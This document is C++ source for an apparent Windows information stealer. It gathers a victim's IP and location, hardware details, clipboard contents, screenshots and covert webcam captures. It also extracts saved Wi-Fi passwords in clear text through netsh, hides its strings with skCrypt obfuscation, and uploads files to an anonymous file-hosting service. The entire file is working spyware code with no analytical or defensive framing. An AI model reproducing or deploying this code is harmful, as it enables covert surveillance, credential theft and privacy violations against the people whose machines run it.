#include "headers.h"

using namespace std;
using Json = nlohmann::json;
namespace fs = std::experimental::filesystem;

EXTERN_C const CLSID CLSID_NullRenderer;
EXTERN_C const CLSID CLSID_SampleGrabber;
vector<string> filesLink;

int GetTimeOfDay(struct timeval* tp, struct timezone* tzp) {
    static const uint64_t EPOCH = ((uint64_t)116444736000000000ULL);

    SYSTEMTIME  system_time;
    FILETIME    file_time;
    uint64_t    time;

    GetSystemTime(&system_time);
    SystemTimeToFileTime(&system_time, &file_time);
    time = ((uint64_t)file_time.dwLowDateTime);
    time += ((uint64_t)file_time.dwHighDateTime) << 32;

    tp->tv_sec = (long)((time - EPOCH) / 10000000L);
    tp->tv_usec = (long)(system_time.wMilliseconds * 1000);
    return 0;
}

string GetRandomUserAgent() {
    timeval time;
    GetTimeOfDay(&time, NULL);
    srand((time.tv_sec * 2654435789U + time.tv_usec) * 2654435789U + _getpid());
    return userAgents[rand() % (end(userAgents) - begin(userAgents))];
}

string GetDate() {
    auto timeNow = time(nullptr);
    ostringstream stream;
    stream << put_time(localtime(&timeNow), ((string)skCrypt("%d-%m-%Y %H:%M:%S")).c_str());
    return stream.str();
}

string GetHWID() {
    HW_PROFILE_INFO hwProfileInfo;
    GetCurrentHwProfile(&hwProfileInfo);
    wstring ws(hwProfileInfo.szHwProfileGuid);
    return string(ws.begin(), ws.end());
}

string GetIPData() {
    string result;
    URLDownloadToFileA(NULL, skCrypt("http://ipwho.is/"), (TEMPFILE).c_str(), 0, NULL);
    SetFileAttributesA((TEMPFILE).c_str(), FILE_ATTRIBUTE_HIDDEN);
    ifstream file((TEMPFILE));
    Json data = Json::parse(file);
    file.close();
    DeleteFileA((TEMPFILE).c_str());
    result += (string)data[(string)skCrypt("ip")] + (string)skCrypt("\n");
    result += (string)data[(string)skCrypt("country")] + (string)skCrypt("\n");
    result += (string)data[(string)skCrypt("city")] + (string)skCrypt("\n");
    result += to_string(data[(string)skCrypt("latitude")]) + (string)skCrypt("\n");
    result += to_string(data[(string)skCrypt("longitude")]) + (string)skCrypt("\n");
    return result;
}

string GetCPU() {
    string result = (string)skCrypt("");
    int cpuInfo[4] = { -1 };
    unsigned nExIds;
    char cpuBrand[64];
    __cpuid(cpuInfo, 0x80000000);
    nExIds = cpuInfo[0];
    for (int i = 0x80000000; i <= nExIds; ++i) {
        __cpuid(cpuInfo, i);
        if (i == 0x80000002)
            memcpy(cpuBrand, cpuInfo, sizeof(cpuInfo));
        else if (i == 0x80000003)
            memcpy(cpuBrand + 16, cpuInfo, sizeof(cpuInfo));
        else if (i == 0x80000004)
            memcpy(cpuBrand + 32, cpuInfo, sizeof(cpuInfo));
    }
    ostringstream stream;
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    MEMORYSTATUSEX stateX;
    stateX.dwLength = sizeof(stateX);
    GlobalMemoryStatusEx(&stateX);
    stream << sysInfo.dwNumberOfProcessors << skCrypt("\n") << (stateX.ullTotalPhys / 1024) / 1024;
    result += cpuBrand;
    result += skCrypt("\n");
    result += stream.str();
    return result;
}

string GetGPU() {
    string result = (string)skCrypt("none");
    DISPLAY_DEVICE displayDevice = { sizeof(displayDevice), 0 };
    if (EnumDisplayDevices(NULL, 0, &displayDevice, EDD_GET_DEVICE_INTERFACE_NAME)) {   /*it takes only the first gpu*/
        wstring ws(displayDevice.DeviceString);
        result = string(ws.begin(), ws.end());
    }
    return result;
}

string GetPcName() {
    string result = (string)skCrypt("none");
    TCHAR  infoBuf[1600];
    DWORD  bufCharCount = 1600;

    if (GetComputerName(infoBuf, &bufCharCount)) {
        wstring ws(&infoBuf[0]);
        result = string(ws.begin(), ws.end());
    }
    return result;
}

string GetUsername() {
    string result = (string)skCrypt("none");
    TCHAR  infoBuf[1600];
    DWORD  bufCharCount = 1600;

    if (GetUserName(infoBuf, &bufCharCount)) {
        wstring ws(&infoBuf[0]);
        result = string(ws.begin(), ws.end());
    }
    return result;
}

string GetResolution() {
    RECT desktop;
    const HWND hDesktop = GetDesktopWindow();
    GetWindowRect(hDesktop, &desktop);
    ostringstream stream;
    stream << desktop.right << skCrypt("x") << desktop.bottom;
    return stream.str();
}

string GetWinVersion() {
    string result = (string)skCrypt("none");
    if (IsWindowsXPOrGreater())
        result = (string)skCrypt("XP / Vista");
    if (IsWindows7OrGreater())
        result = (string)skCrypt("Seven");
    if (IsWindows7SP1OrGreater())
        result = (string)skCrypt("Seven SP1");
    if (IsWindows8OrGreater())
        result = (string)skCrypt("Eight");
    if (IsWindows8Point1OrGreater())
        result = (string)skCrypt("Eight.one");
    if (IsWindows10OrGreater())
        result = (string)skCrypt("Ten");
    if (IsWindowsServer())
        result = (string)skCrypt("Server");
    return result;
}

string GetLanguage() {
    char buf[10];
    return string(buf, GetLocaleInfoA(LOCALE_SYSTEM_DEFAULT, LOCALE_SISO639LANGNAME, buf, sizeof(buf)) - 1) +
        (string)skCrypt("-") +
        string(buf, GetLocaleInfoA(LOCALE_SYSTEM_DEFAULT, LOCALE_SISO3166CTRYNAME, buf, sizeof(buf)));
}

string GetClipboard() {
    string result = (string)skCrypt("none");
    if (!OpenClipboard(nullptr))
        return result;

    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData == nullptr)
        return result;

    char* pszText = static_cast<char*>(GlobalLock(hData));
    if (pszText == nullptr)
        return result;

    result = pszText;
    GlobalUnlock(hData);
    CloseClipboard();
    return result;
}

string GetWifi() {
    bool directoryCreated = false;
    if (!fs::is_directory(WIFI_PATH) || !fs::exists(WIFI_PATH)) {
        fs::create_directory(WIFI_PATH);
        directoryCreated = true;
    }

    Exec(((string)skCrypt("netsh wlan export profile folder=\"") + WIFI_PATH + (string)skCrypt("\\\" key=clear && cls")).c_str());

    vector<string> wifiFiles = Split(Exec(((string)skCrypt("dir /s /b /a-d ") + WIFI_PATH).c_str()), '\n');

    string result = (string)skCrypt("");
    bool first = true;

    for (string wifi : wifiFiles) {
        if (wifi.size() <= 4)
            continue;

        ifstream wifiFIle(wifi);
        stringstream buffer;
        buffer << wifiFIle.rdbuf();
        wifiFIle.close();
        string content = buffer.str();

        if (first)
            first = false;
        else
            result += skCrypt("\n");

        result += skCrypt("SSID: ");
        for (int i = content.find(skCrypt("<name>")) + 6; i < content.find(skCrypt("</name>")); i++)
            result += content[i];
        result += skCrypt("\n");

        result += skCrypt("Password: ");
        for (int i = content.find(skCrypt("<keyMaterial>")) + 13; i < content.find(skCrypt("</keyMaterial>")); i++)
            result += content[i];
        result += skCrypt("\n");
    }

    if (directoryCreated)
        fs::remove_all((WIFI_PATH).c_str());

    return result;
}

string GetScreenshot() {
    string filename = TEMPFILE + (string)skCrypt(".bmp");
    string filename2 = TEMPFILE + (string)skCrypt(".jpg");

    HWND desktopHwnd = GetDesktopWindow();
    RECT desktopParams;
    HDC devC = GetDC(desktopHwnd);
    GetWindowRect(desktopHwnd, &desktopParams);
    DWORD width = desktopParams.right - desktopParams.left;
    DWORD height = desktopParams.bottom - desktopParams.top;

    DWORD fileSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + (sizeof(RGBTRIPLE) + 1 * (width * height * 4));
    char* bmpData = (char*)GlobalAlloc(0x0040, fileSize);

    PBITMAPFILEHEADER fileHeader = (PBITMAPFILEHEADER)bmpData;
    PBITMAPINFOHEADER  infoHeader = (PBITMAPINFOHEADER)&bmpData[sizeof(BITMAPFILEHEADER)];

    fileHeader->bfType = 0x4D42;
    fileHeader->bfSize = sizeof(BITMAPFILEHEADER);
    fileHeader->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    infoHeader->biSize = sizeof(BITMAPINFOHEADER);
    infoHeader->biPlanes = 1;
    infoHeader->biBitCount = 24;
    infoHeader->biCompression = BI_RGB;
    infoHeader->biHeight = height;
    infoHeader->biWidth = width;

    RGBTRIPLE* image = (RGBTRIPLE*)&bmpData[sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)];
    RGBTRIPLE color;

    HDC captureDC = CreateCompatibleDC(devC);
    HBITMAP captureBitmap = CreateCompatibleBitmap(devC, width, height);
    SelectObject(captureDC, captureBitmap);
    BitBlt(captureDC, 0, 0, width, height, devC, 0, 0, SRCCOPY | CAPTUREBLT);
    GetDIBits(captureDC, captureBitmap, 0, height, image, (LPBITMAPINFO)infoHeader, DIB_RGB_COLORS);

    HANDLE hFile = CreateFileA(filename.c_str(), GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, 0, 0);
    WriteFile(hFile, bmpData, fileSize, new DWORD, 0);
    CloseHandle(hFile);
    GlobalFree(bmpData);

    CImage Cimage;
    HRESULT res = Cimage.Load((const wchar_t*)wstring(filename.begin(), filename.end()).c_str());
    Cimage.Save((const wchar_t*)wstring(filename2.begin(), filename2.end()).c_str());

    ifstream imageFile(filename2, ios::in | ios::binary);
    vector<BYTE> data(istreambuf_iterator<char>(imageFile), {});
    string result = base64_encode(&data[0], data.size());
    imageFile.close();

    if (remove(filename.c_str()) != 0)
        DeleteFileA(filename.c_str());
    if (remove(filename2.c_str()) != 0)
        DeleteFileA(filename2.c_str());

    return result;
}

vector<string> GetWebcams() {
    vector<string> webcams;

    HRESULT hr;
    ICreateDevEnum* pDevEnum = NULL;
    IEnumMoniker* pEnum = NULL;
    IMoniker* pMoniker = NULL;
    IPropertyBag* pPropBag = NULL;
    IGraphBuilder* pGraph = NULL;
    ICaptureGraphBuilder2* pBuilder = NULL;
    IBaseFilter* pCap = NULL;
    IBaseFilter* pSampleGrabberFilter = NULL;
    DexterLib::ISampleGrabber* pSampleGrabber = NULL;
    IBaseFilter* pNullRenderer = NULL;
    IMediaControl* pMediaControl = NULL;
    char* pBuffer = NULL;

    bool deleteFolder = false;
    if (!fs::is_directory(WEBCAM_PATH) || !fs::exists(WEBCAM_PATH)) {
        fs::create_directory(WEBCAM_PATH);
        deleteFolder = true;
    }

    vector<string> filenames;

    VIDEOINFOHEADER* pVih = NULL;
    long buffer_size = 0;
    int n = 1;

    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (hr != S_OK)
        goto cleanup;

    hr = CoCreateInstance(CLSID_FilterGraph, NULL,
        CLSCTX_INPROC_SERVER, IID_IGraphBuilder,
        (void**)&pGraph);
    if (hr != S_OK)
        goto cleanup;

    hr = CoCreateInstance(CLSID_CaptureGraphBuilder2, NULL,
        CLSCTX_INPROC_SERVER, IID_ICaptureGraphBuilder2,
        (void**)&pBuilder);
    if (hr != S_OK)
        goto cleanup;

    hr = pBuilder->SetFiltergraph(pGraph);
    if (hr != S_OK)
        goto cleanup;

    hr = CoCreateInstance(CLSID_SystemDeviceEnum, NULL,
        CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pDevEnum));
    if (hr != S_OK)
        goto cleanup;

    hr = pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0);
    if (hr != S_OK)
        goto cleanup;


    VARIANT var;
    n = 0;
    while (true) {
        hr = pEnum->Next(1, &pMoniker, NULL);

        if (hr != S_OK)
            goto cleanup;

        n++;

        hr = pMoniker->BindToStorage(0, 0, IID_PPV_ARGS(&pPropBag));
        VariantInit(&var);
        hr = pPropBag->Read(CA2W(skCrypt("FriendlyName")), &var, 0);
        _bstr_t tmp(var.bstrVal);
        wstring FullFIleName((wchar_t*)tmp, tmp.length());
        string filename = WEBCAM_PATH + string(FullFIleName.begin(), FullFIleName.end()) + (string)skCrypt(".bmp");
        VariantClear(&var);

        hr = pMoniker->BindToObject(0, 0, IID_IBaseFilter, (void**)&pCap);
        if (hr != S_OK)
            goto cleanup;

        hr = pGraph->AddFilter(pCap, CA2W(skCrypt("Capture Filter")));
        if (hr != S_OK)
            goto cleanup;

        hr = CoCreateInstance(CLSID_SampleGrabber, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&pSampleGrabberFilter);
        if (hr != S_OK)
            goto cleanup;

        hr = pSampleGrabberFilter->QueryInterface(DexterLib::IID_ISampleGrabber, (void**)&pSampleGrabber);
        if (hr != S_OK)
            goto cleanup;

        hr = pSampleGrabber->SetBufferSamples(TRUE);
        if (hr != S_OK)
            goto cleanup;

        AM_MEDIA_TYPE mt;
        ZeroMemory(&mt, sizeof(AM_MEDIA_TYPE));
        mt.majortype = MEDIATYPE_Video;
        mt.subtype = MEDIASUBTYPE_RGB24;
        hr = pSampleGrabber->SetMediaType((DexterLib::_AMMediaType*)&mt);
        if (hr != S_OK)
            goto cleanup;

        hr = pGraph->AddFilter(pSampleGrabberFilter, CA2W(skCrypt("SampleGrab")));
        if (hr != S_OK)
            goto cleanup;

        hr = CoCreateInstance(CLSID_NullRenderer, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&pNullRenderer);
        if (hr != S_OK)
            goto cleanup;

        hr = pGraph->AddFilter(pNullRenderer, CA2W(skCrypt("NullRender")));
        if (hr != S_OK)
            goto cleanup;

        hr = pBuilder->RenderStream(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video, pCap, pSampleGrabberFilter, pNullRenderer);
        if (hr != S_OK)
            goto cleanup;

        hr = pGraph->QueryInterface(IID_IMediaControl, (void**)&pMediaControl);
        if (hr != S_OK)
            goto cleanup;

        while (true) {
            hr = pMediaControl->Run();

            if (hr == S_OK)
                break;
            if (hr == S_FALSE)
                continue;

            goto cleanup;
        }


        while (true) {
            hr = pSampleGrabber->GetCurrentBuffer(&buffer_size, NULL);
            if (hr == S_OK && buffer_size != 0)
                break;
            if (hr != S_OK && hr != VFW_E_WRONG_STATE)
                goto cleanup;
        }

        pMediaControl->Stop();

        pBuffer = new char[buffer_size];
        if (!pBuffer)
            goto cleanup;

        hr = pSampleGrabber->GetCurrentBuffer(&buffer_size, (long*)pBuffer);
        if (hr != S_OK)
            goto cleanup;

        hr = pSampleGrabber->GetConnectedMediaType((DexterLib::_AMMediaType*)&mt);
        if (hr != S_OK)
            goto cleanup;

        if (mt.formattype == FORMAT_VideoInfo && mt.cbFormat >= sizeof(VIDEOINFOHEADER) && mt.pbFormat != NULL) {
            pVih = (VIDEOINFOHEADER*)mt.pbFormat;

            long cbBitmapInfoSize = mt.cbFormat - SIZE_PREHEADER;
            BITMAPFILEHEADER bfh;
            ZeroMemory(&bfh, sizeof(bfh));
            bfh.bfType = 'MB';
            bfh.bfSize = sizeof(bfh) + buffer_size + cbBitmapInfoSize;
            bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + cbBitmapInfoSize;

            wchar_t wtext[100];
            mbstowcs(wtext, filename.c_str(), filename.length() + 1);
            HANDLE hf = CreateFile(wtext, GENERIC_WRITE,
                FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, NULL);
            if (hf == INVALID_HANDLE_VALUE)
                goto cleanup;

            DWORD dwWritten = 0;
            WriteFile(hf, &bfh, sizeof(bfh), &dwWritten, NULL);
            WriteFile(hf, HEADER(pVih),
                cbBitmapInfoSize, &dwWritten, NULL);

            WriteFile(hf, pBuffer, buffer_size, &dwWritten, NULL);
            CloseHandle(hf);
        }
        else
            goto cleanup;


        if (mt.cbFormat != 0) {
            CoTaskMemFree((PVOID)mt.pbFormat);
            mt.cbFormat = 0;
            mt.pbFormat = NULL;
        }
        if (mt.pUnk != NULL) {
            mt.pUnk->Release();
            mt.pUnk = NULL;
        }

        filenames.push_back(filename);

        if (n >= MAX_PHOTOS)
            break;
    }


cleanup:
    if (pBuffer != NULL)
        delete[](pBuffer);
    if (pMediaControl != NULL)
        pMediaControl->Release();
    if (pNullRenderer != NULL)
        pNullRenderer->Release();
    if (pSampleGrabber != NULL)
        pSampleGrabber->Release();
    if (pSampleGrabberFilter != NULL)
        pSampleGrabberFilter->Release();
    if (pCap != NULL)
        pCap->Release();
    if (pBuilder != NULL)
        pBuilder->Release();
    if (pGraph != NULL)
        pGraph->Release();
    if (pPropBag != NULL)
        pPropBag->Release();
    if (pMoniker != NULL)
        pMoniker->Release();
    if (pEnum != NULL)
        pEnum->Release();
    if (pDevEnum != NULL)
        pDevEnum->Release();
    CoUninitialize();



    for (string file : filenames) {
        string file2 = Split(Split(file, '\\').back(), '.')[0] + (string)skCrypt(".jpg");
        CImage Cimage;
        HRESULT res = Cimage.Load((const wchar_t*)wstring(file.begin(), file.end()).c_str());
        Cimage.Save((const wchar_t*)wstring(file2.begin(), file2.end()).c_str());

        ifstream webcamFile(file2, ios::in | ios::binary);
        vector<BYTE> data(istreambuf_iterator<char>(webcamFile), {});
        webcams.push_back(Split(file2, '\\').back() + (string)skCrypt(" ") + base64_encode(&data[0], data.size()));
        webcamFile.close();

        if (remove(file.c_str()) != 0)
            DeleteFileA(file.c_str());
        if (remove(file2.c_str()) != 0)
            DeleteFileA(file2.c_str());
    }

    if (deleteFolder)
        fs::remove_all(WEBCAM_PATH);

    return webcams;
}

void UploadFiles(const vector<string>& files) {
    for (string file : files) {
        string boundary = (string)skCrypt("$$") + GenerateRandom(32) + (string)skCrypt("$$");
        string header = (string)skCrypt("Content-Type: multipart/form-data; boundary=") + boundary;
        string beggining = (string)skCrypt("--") + boundary + (string)skCrypt("\r\nContent-Disposition: form-data; name=\"file\"; filename=\"") + Split(file, '\\').back() + (string)skCrypt("\"\r\nContent-Type: application/octet-stream\r\n\r\n");
        string ending = (string)skCrypt("\r\n--") + boundary + (string)skCrypt("--\r\n");
        string userAgent = userAgents[0];
        if (RANDOM_USERAGENT)
            userAgent = GetRandomUserAgent();

        ifstream rFile(file, ios::in);
        stringstream buffer;
        buffer << rFile.rdbuf();
        rFile.close();
        string data = beggining + buffer.str() + ending;

        HINTERNET hsession = NULL, hconnect = NULL, hrequest = NULL;

        hsession = InternetOpenA(userAgent.c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (!hsession)
            goto cleanup;

        hconnect = InternetConnectA(hsession, skCrypt("api.anonfile.com"), INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!hconnect)
            goto cleanup;

        hrequest = HttpOpenRequestA(hconnect, skCrypt("POST"), skCrypt("/upload"), NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
        if (!hrequest)
            goto cleanup;

        if (!HttpSendRequestA(hrequest, header.c_str(), (DWORD)-1, (LPVOID)data.c_str(), data.size()))
            goto cleanup;

        DWORD received;
        BYTE buf[1024];
        while (InternetReadFile(hrequest, buf, sizeof(buf), &received) && received) {
            buf[received] = 0;
            char str[sizeof(buf) + 1];
            memcpy(str, buf, sizeof(buf));
            str[sizeof(buf)] = 0;
            Json data = Json::parse(str);
            if (data[(string)skCrypt("status")])
                filesLink.push_back((string)data[(string)skCrypt("data")][(string)skCrypt("file")][(string)skCrypt("url")][(string)skCrypt("full")]);
            else
                filesLink.push_back((string)skCrypt("none"));
        }


    cleanup:
        if (hsession)
            InternetCloseHandle(hsession);
        if (hconnect)
            InternetCloseHandle(hconnect);
        if (hrequest)
            InternetCloseHandle(hrequest);
    }
}

vector<string> GetLinks() {
    return filesLink;
}
